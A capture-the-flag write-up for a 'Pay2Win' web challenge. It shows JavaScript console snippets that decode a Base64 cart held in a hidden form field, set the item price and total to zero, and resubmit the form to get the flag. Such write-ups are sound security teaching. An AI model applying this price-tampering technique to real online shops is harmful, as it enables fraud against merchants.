# Pay2Win

We're presented with an online shop where we need to buy a product, but we don't have enough money to complete the purchase.

Looking at the checkout page source, there's a hidden input field called `cart_input` that holds the cart data as a Base64-encoded JSON string. The server trusts this client-side value when processing the order, meaning we can tamper with it before submitting.

## Solution
I solved this using the browser DevTools console, though intercepting the request with Burp Suite would be even easier since you can edit the Base64 payload directly in the proxy before it reaches the server.

Open the browser console on the checkout page and decode the cart:

```js
let cart = JSON.parse(atob(document.getElementById('cart_input').value));
console.log(cart);
```

This reveals a JSON object containing the item and its price. We simply set the price and total to zero:

```js
cart.items[0].price = 0;
cart.total = 0;
```

Then re-encode it and put it back:

```js
document.getElementById('cart_input').value = btoa(JSON.stringify(cart));
```

Fill in the checkout form with any details and submit. The server accepts the modified cart and we get the flag.

The flag was: `FLAG{Now_I_still_have_money_to_bribe_the_jury}`

--------------------

I hope this helps, have a nice day :)
